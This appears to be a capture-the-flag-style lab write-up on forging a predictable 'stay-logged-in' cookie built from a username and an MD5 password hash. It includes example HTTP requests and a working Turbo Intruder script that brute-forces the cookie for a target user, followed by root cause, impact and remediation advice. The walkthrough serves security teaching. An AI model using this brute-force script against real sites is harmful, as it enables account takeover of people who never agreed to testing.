# Brute-Forcing a Stay-Logged-In Cookie

## Overview

This lab demonstrates an authentication weakness caused by a **predictable persistent-login cookie**.

The application's `stay-logged-in` cookie was not a random server-generated token. Instead, it was deterministically derived from the username and an MD5 hash of the user's password.

Because the cookie itself was accepted as an authentication credential, an attacker who knew a target username could generate candidate cookies from a password wordlist and brute-force the victim's persistent login token without using the normal login endpoint.

---

## Initial Observation

Logging in as the known test user with the **Stay logged in** option enabled caused the application to issue an additional cookie:

```http
Set-Cookie: stay-logged-in=<encoded-value>
```

The known credentials were:

```text
username: wiener
password: peter
```

The cookie value appeared to be Base64 encoded.

---

## Reverse-Engineering the Cookie Format

The first Base64-decoded component revealed the username `wiener`.

The cookie was then reproduced from the known password.

The MD5 hash of:

```text
peter
```

is:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

Combining the username and password hash produced:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Base64-encoding this string generated exactly the same `stay-logged-in` value issued by the application.

The cookie format was therefore confirmed as:

```text
Base64(username + ":" + MD5(password))
```

This meant the persistent authentication token was completely predictable for any known username/password pair.

---

## Confirming the Cookie Acts as an Authentication Token

A request to the authenticated account page was sent with the normal session cookie removed:

```http
GET /my-account?id=wiener HTTP/2
Host: <lab-host>
Cookie: stay-logged-in=<wiener-cookie>
```

The application still returned the authenticated account page.

This confirmed that the `stay-logged-in` cookie was sufficient on its own to authenticate the user.

Conceptually:

```text
valid stay-logged-in cookie
        |
        v
application reconstructs / accepts identity
        |
        v
authenticated account access
```

The normal session cookie was not required.

---

## Attack Strategy

The target username was known to be:

```text
carlos
```

For each candidate password, the following transformation could be performed:

```text
password candidate
        |
        v
MD5(password)
        |
        v
carlos:<md5-hash>
        |
        v
Base64 encode
        |
        v
stay-logged-in=<candidate-token>
```

Each generated token could then be tested directly against the authenticated account endpoint:

```http
GET /my-account?id=carlos HTTP/1.1
Host: <lab-host>
Cookie: stay-logged-in=<candidate-token>
```

This avoided the application's normal password-login workflow entirely.

---

## Automating the Attack with Turbo Intruder

Turbo Intruder was used to transform each password candidate into the expected persistent-login cookie and send the resulting request.

```python
import hashlib
import base64


def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.THREADED
    )

    passwords = [
        '123456',
        'password',
        '12345678',
        'qwerty',
        '123456789',
        '12345',
        '1234',
        # additional candidates omitted here for brevity
    ]

    for password in passwords:
        md5_hash = hashlib.md5(password).hexdigest()
        raw_cookie = 'carlos:' + md5_hash
        encoded_cookie = base64.b64encode(raw_cookie)

        engine.queue(
            target.req,
            encoded_cookie,
            label=password
        )


def handleResponse(req, interesting):
    if 'carlos' in req.response.lower():
        table.add(req)
```

Using the original password candidate as the request label made it possible to identify the successful password directly instead of manually decoding the resulting cookie.

---

## Successful Authentication

One candidate produced Carlos's authenticated account page and solved the lab.

The successful Turbo Intruder result was labelled:

```text
1234
```

Therefore, the target password was:

```text
1234
```

The generated persistent-login cookie successfully authenticated as Carlos without submitting the password through the normal login form.

---

## Why the Attack Worked

The application used a predictable transformation of password-derived data as a long-lived bearer token:

```text
Base64(username:MD5(password))
```

None of the components added meaningful protection:

- the username was already known;
- MD5 is a fast, unsalted hash and is unsuitable for password protection;
- Base64 is encoding, not encryption;
- the resulting value was accepted directly as proof of authentication.

As a result, a password wordlist could be transformed into valid candidate authentication tokens without interacting with the normal credential-validation endpoint.

---

## Root Cause

The root cause was the use of **password-derived, deterministic data as a persistent authentication token**.

Persistent login tokens should be high-entropy, unpredictable secrets generated independently of the user's password.

Instead, the application's token could be calculated by anyone who knew:

```text
username + candidate password
```

The design also exposed the password hash structure to the client and used fast MD5 hashing, making candidate generation inexpensive.

---

## Impact

An attacker who knows or can guess a username can brute-force persistent authentication tokens directly.

Potential consequences include:

- account takeover;
- bypass of normal login controls;
- bypass of protections applied only to the password-login endpoint;
- long-lived unauthorized access;
- easier credential guessing due to the fast MD5 transformation.

Because the cookie operates as a bearer credential, possession of a valid value is sufficient to impersonate the associated user.

---

## Remediation

Persistent-login functionality should use cryptographically random, server-managed tokens.

Recommended controls include:

- generate high-entropy random remember-me tokens using a cryptographically secure random number generator;
- store only a secure representation of the token server-side;
- associate each token with a specific user and device/session context where appropriate;
- support token expiration, rotation, and revocation;
- invalidate persistent tokens after password changes and other security-sensitive events;
- never derive authentication tokens directly from usernames, passwords, or password hashes;
- use a modern password-hashing function such as Argon2id, bcrypt, or scrypt for stored passwords;
- apply `Secure`, `HttpOnly`, and an appropriate `SameSite` policy to authentication cookies;
- monitor and rate-limit repeated invalid persistent-login attempts.

---

## Key Takeaway

A remember-me cookie must be treated as an authentication credential, not merely as a convenience value.

When testing persistent authentication, determine:

```text
Is the token random or deterministic?
Can its contents be decoded?
Is it derived from the password?
Does it work without the normal session cookie?
Can candidate tokens be generated offline?
Are invalid token attempts rate-limited?
```

In this lab, reverse-engineering the token format turned a weak password candidate into a directly forgeable authentication cookie.
